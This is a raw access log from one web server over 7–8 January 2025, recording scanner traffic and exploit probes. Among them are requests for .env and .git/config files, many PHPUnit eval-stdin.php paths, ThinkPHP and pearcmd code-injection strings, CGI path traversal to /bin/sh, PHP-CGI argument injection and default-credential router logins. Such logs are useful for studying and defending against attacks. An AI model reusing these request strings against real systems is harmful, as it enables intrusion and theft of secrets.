78.153.140.148 - - [08/Jan/2025:16:29:41 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [08/Jan/2025:16:29:41 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
91.223.3.201 - - [08/Jan/2025:16:52:02 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
152.42.247.210 - - [08/Jan/2025:16:55:56 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
152.42.247.210 - - [08/Jan/2025:16:56:06 +0000] "\x16\x03\x01\x01\v\x01" 400 528 "-" "-"
120.76.250.13 - - [08/Jan/2025:16:59:35 +0000] "GET /containers/json HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
178.128.54.126 - - [08/Jan/2025:17:04:21 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
178.128.54.126 - - [08/Jan/2025:17:04:33 +0000] "\x16\x03\x01\x01\v\x01" 400 528 "-" "-"
152.42.247.210 - - [08/Jan/2025:17:08:36 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
152.42.247.210 - - [08/Jan/2025:17:08:45 +0000] "\x16\x03\x01\x01\v\x01" 400 528 "-" "-"
159.223.67.34 - - [08/Jan/2025:17:09:17 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
159.223.67.34 - - [08/Jan/2025:17:09:25 +0000] "\x16\x03\x01\x01\v\x01" 400 528 "-" "-"
167.94.145.104 - - [08/Jan/2025:17:34:49 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.94.145.104 - - [08/Jan/2025:17:34:53 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.104 - - [08/Jan/2025:17:34:53 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.104 - - [08/Jan/2025:17:34:53 +0000] "GET / HTTP/1.1" 200 966 "http://34.89.130.92/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.104 - - [08/Jan/2025:17:34:53 +0000] "PRI * HTTP/2.0" 400 528 "-" "-"
45.156.129.131 - - [08/Jan/2025:17:36:44 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
45.156.129.54 - - [08/Jan/2025:17:36:44 +0000] "GET /css/images/PTZOptics_powerby.png HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
193.34.212.75 - - [08/Jan/2025:18:48:36 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
5.101.6.131 - - [08/Jan/2025:18:54:49 +0000] "\x16\x03\x02\x01o\x01" 400 528 "-" "-"
45.164.178.158 - - [08/Jan/2025:19:05:15 +0000] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 302 350 "-" "-"
78.153.140.148 - - [08/Jan/2025:19:05:44 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [08/Jan/2025:19:05:44 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.16.39.104 - - [08/Jan/2025:19:10:44 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
178.32.170.30 - - [08/Jan/2025:19:27:16 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
198.235.24.35 - - [08/Jan/2025:19:43:02 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
185.196.220.253 - - [08/Jan/2025:19:54:37 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
206.168.34.193 - - [08/Jan/2025:19:59:17 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.193 - - [08/Jan/2025:19:59:23 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.193 - - [08/Jan/2025:19:59:25 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.193 - - [08/Jan/2025:19:59:29 +0000] "GET / HTTP/1.1" 200 966 "http://34.89.130.92/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.193 - - [08/Jan/2025:19:59:29 +0000] "PRI * HTTP/2.0" 400 528 "-" "-"
31.13.224.222 - - [08/Jan/2025:20:11:14 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36"
78.153.140.148 - - [08/Jan/2025:20:15:32 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [08/Jan/2025:20:15:32 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
205.210.31.129 - - [08/Jan/2025:20:48:55 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
111.7.96.159 - - [08/Jan/2025:20:56:41 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
111.7.96.159 - - [08/Jan/2025:20:56:42 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
111.7.96.159 - - [08/Jan/2025:20:56:42 +0000] "GET /js/brand.js HTTP/1.1" 200 514 "http://34.89.130.92/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
111.7.96.159 - - [08/Jan/2025:20:56:42 +0000] "GET /js/login.js HTTP/1.1" 200 866 "http://34.89.130.92/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
111.7.96.159 - - [08/Jan/2025:20:56:54 +0000] "GET /js/services/LoggerService.js HTTP/1.1" 200 1289 "http://34.89.130.92/js/login.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
111.7.96.159 - - [08/Jan/2025:20:56:54 +0000] "GET /js/utils/json-manipulator.js HTTP/1.1" 200 509 "http://34.89.130.92/js/brand.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
111.7.96.159 - - [08/Jan/2025:20:56:55 +0000] "GET /config/brand.json HTTP/1.1" 200 311 "http://34.89.130.92/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
111.7.96.159 - - [08/Jan/2025:20:56:57 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
111.7.96.159 - - [08/Jan/2025:20:56:57 +0000] "GET / HTTP/1.1" 200 947 "http://34.89.130.92/favicon.ico" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
205.210.31.193 - - [08/Jan/2025:20:58:07 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
92.255.57.58 - - [08/Jan/2025:21:02:20 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
178.215.236.132 - - [08/Jan/2025:21:17:35 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57"
78.153.140.148 - - [08/Jan/2025:21:27:11 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [08/Jan/2025:21:27:12 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
46.19.138.234 - - [08/Jan/2025:21:28:19 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.121.15.109 - - [08/Jan/2025:21:36:10 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
139.5.1.245 - - [08/Jan/2025:21:37:37 +0000] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 302 350 "-" "-"
172.104.11.4 - - [08/Jan/2025:21:45:44 +0000] "\x16\x03\x01" 400 528 "-" "-"
47.91.91.123 - - [08/Jan/2025:21:48:32 +0000] "\x16\x03\x01" 400 528 "-" "-"
92.255.57.58 - - [08/Jan/2025:21:54:44 +0000] "GET /actuator/gateway/routes HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [08/Jan/2025:21:54:45 +0000] "GET / HTTP/1.1" 200 966 "http://34.89.130.92:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
179.43.191.146 - - [08/Jan/2025:22:01:44 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.34.212.75 - - [08/Jan/2025:22:14:43 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
92.255.57.58 - - [08/Jan/2025:22:19:08 +0000] "\x16\x03\x01\x05\xa8\x01" 400 528 "-" "-"
78.153.140.148 - - [08/Jan/2025:22:22:06 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [08/Jan/2025:22:22:06 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
87.120.115.119 - - [08/Jan/2025:22:43:28 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2"
91.223.3.201 - - [08/Jan/2025:22:47:38 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
83.222.191.146 - - [08/Jan/2025:22:47:48 +0000] "GET / HTTP/1.0" 200 1003 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
121.141.64.200 - - [08/Jan/2025:22:57:45 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 486 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:46 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 486 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:46 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 302 387 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:46 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:47 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:47 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:47 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:48 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:48 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:48 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:49 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:49 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:50 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:50 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:50 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:51 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:51 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:51 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:52 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:52 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:52 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:53 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:53 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:53 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:54 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:54 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:55 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:55 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:55 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:56 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:56 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:56 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:56 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:57 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:57 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:57 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:58 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:58 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:58 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:59 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:59 +0000] "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:59 +0000] "GET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:57:59 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:58:00 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
121.141.64.200 - - [08/Jan/2025:22:58:00 +0000] "GET /containers/json HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
40.112.186.230 - - [08/Jan/2025:23:13:43 +0000] "GET /portal/redlion HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
210.123.159.185 - - [08/Jan/2025:23:16:45 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
66.240.223.202 - - [08/Jan/2025:23:19:02 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
154.213.184.132 - - [08/Jan/2025:23:19:50 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
78.153.140.148 - - [08/Jan/2025:23:22:50 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [08/Jan/2025:23:22:51 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
195.3.223.55 - - [08/Jan/2025:23:26:54 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
172.168.41.107 - - [08/Jan/2025:23:35:05 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
59.22.129.60 - - [08/Jan/2025:23:35:19 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
193.34.212.75 - - [07/Jan/2025:00:03:45 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
154.213.184.132 - - [07/Jan/2025:00:23:50 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
5.181.190.248 - - [07/Jan/2025:00:24:32 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.148 - - [07/Jan/2025:00:46:42 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [07/Jan/2025:00:46:43 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
178.128.54.126 - - [07/Jan/2025:00:55:00 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
178.128.54.126 - - [07/Jan/2025:00:55:11 +0000] "\x16\x03\x01\x01\v\x01" 400 528 "-" "-"
178.128.54.126 - - [07/Jan/2025:01:02:57 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
178.128.54.126 - - [07/Jan/2025:01:03:08 +0000] "\x16\x03\x01\x01\v\x01" 400 528 "-" "-"
159.223.69.51 - - [07/Jan/2025:01:06:58 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
159.223.69.51 - - [07/Jan/2025:01:07:07 +0000] "\x16\x03\x01\x01\v\x01" 400 528 "-" "-"
152.42.247.210 - - [07/Jan/2025:01:07:45 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
152.42.247.210 - - [07/Jan/2025:01:07:52 +0000] "\x16\x03\x01\x01\v\x01" 400 528 "-" "-"
179.43.191.146 - - [07/Jan/2025:01:12:04 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.53.198 - - [07/Jan/2025:01:13:21 +0000] "GET /cgi-bin/php/login.php HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36"
178.215.236.132 - - [07/Jan/2025:01:32:09 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36"
165.154.41.213 - - [07/Jan/2025:01:33:13 +0000] "GET / HTTP/1.1" 200 1742 "-" "curl/7.29.0"
165.154.41.213 - - [07/Jan/2025:01:33:14 +0000] "\x16\x03\x01" 400 528 "-" "-"
165.154.41.213 - - [07/Jan/2025:01:33:14 +0000] "t3 12.1.2\n" 400 528 "-" "-"
95.214.53.198 - - [07/Jan/2025:01:34:10 +0000] "GET /cgi-bin/php/login.php HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36"
46.19.138.234 - - [07/Jan/2025:01:43:11 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
118.193.45.235 - - [07/Jan/2025:02:07:51 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 7_2_1; Win64; x64) AppleWebKit/538.35 (KHTML, like Gecko) Chrome/97.0.327 Safari/537.36"
118.193.45.235 - - [07/Jan/2025:02:07:51 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
118.193.45.235 - - [07/Jan/2025:02:07:51 +0000] "GET / HTTP/1.1" 200 966 "http://34.89.130.92/favicon.ico" "Go-http-client/1.1"
118.193.45.235 - - [07/Jan/2025:02:07:52 +0000] "GET /js/login.js HTTP/1.1" 200 885 "-" "Go-http-client/1.1"
118.193.45.235 - - [07/Jan/2025:02:07:52 +0000] "GET /js/brand.js HTTP/1.1" 200 533 "-" "Go-http-client/1.1"
118.193.45.235 - - [07/Jan/2025:02:07:53 +0000] "GET /robots.txt HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
118.193.45.235 - - [07/Jan/2025:02:07:53 +0000] "GET /sitemap.xml HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
118.193.45.235 - - [07/Jan/2025:02:07:53 +0000] "GET / HTTP/1.1" 200 966 "http://34.89.130.92/sitemap.xml" "Go-http-client/1.1"
